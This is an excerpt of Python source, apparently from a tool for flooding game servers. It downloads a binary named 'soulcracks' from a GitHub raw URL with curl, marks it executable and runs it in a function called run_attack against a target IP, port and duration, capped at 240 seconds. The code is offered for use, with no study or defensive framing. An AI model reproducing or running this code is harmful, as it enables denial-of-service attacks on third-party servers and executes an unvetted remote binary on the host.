...
MAX_DURATION = 240  # Maximum allowed duration

# URL to the soulcracks file in the specified repo
SOULCRACKS_FILE_URL = "https://raw.githubusercontent.com/Gamewallah63/bgmi/main/soulcracks"
TEMP_FILE_PATH = "temp_soulcracks"

async def download_soulcracks_file():
    # Download the soulcracks file temporarily
    download_command = f"curl -sSL {SOULCRACKS_FILE_URL} -o {TEMP_FILE_PATH}"
...
async def run_attack(target_ip, target_port, duration):
    ...
    await download_soulcracks_file()

    # Make the new file executable
    os.chmod(TEMP_FILE_PATH, 0o755)

    # Execute the soulcracks file
    command = f"./{TEMP_FILE_PATH} {target_ip} {target_port} {duration} 70"
